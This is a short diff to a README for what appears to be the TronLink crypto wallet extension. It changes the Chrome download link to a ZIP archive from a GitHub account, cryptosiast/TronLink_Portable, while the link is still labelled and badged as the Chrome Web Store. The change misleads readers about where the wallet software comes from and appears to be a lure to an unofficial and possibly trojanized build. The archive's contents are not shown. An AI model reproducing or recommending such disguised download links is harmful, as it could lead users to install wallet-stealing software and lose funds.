@@ -9,7 +9,7 @@ Smart contract calls integrated;
 
 
 ## Downloads
-**Chrome** &ndash; [Download]([https://chrome.google.com/webstore/detail/ibnejdfjmmkpcnlpebklmnkoeoihofec](https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip)) &nbsp; [![Chrome Web Store]([https://img.shields.io/chrome-web-store/d/ogffaloegjglncjfehdfplabnoondfjo.svg?style=flat-square](https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip))](https://chrome.google.com/webstore/detail/ibnejdfjmmkpcnlpebklmnkoeoihofec) &nbsp; [![Chrome Web Store](https://img.shields.io/chrome-web-store/rating/ogffaloegjglncjfehdfplabnoondfjo.svg?style=flat-square)](https://chrome.google.com/webstore/detail/ibnejdfjmmkpcnlpebklmnkoeoihofec)
+**Chrome** &ndash; [Download]([https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip](https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip)) &nbsp; [![Chrome Web Store]([https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip](https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip))](https://chrome.google.com/webstore/detail/ibnejdfjmmkpcnlpebklmnkoeoihofec) &nbsp; [![Chrome Web Store](https://img.shields.io/chrome-web-store/rating/ogffaloegjglncjfehdfplabnoondfjo.svg?style=flat-square)](https://chrome.google.com/webstore/detail/ibnejdfjmmkpcnlpebklmnkoeoihofec)
 
 
 
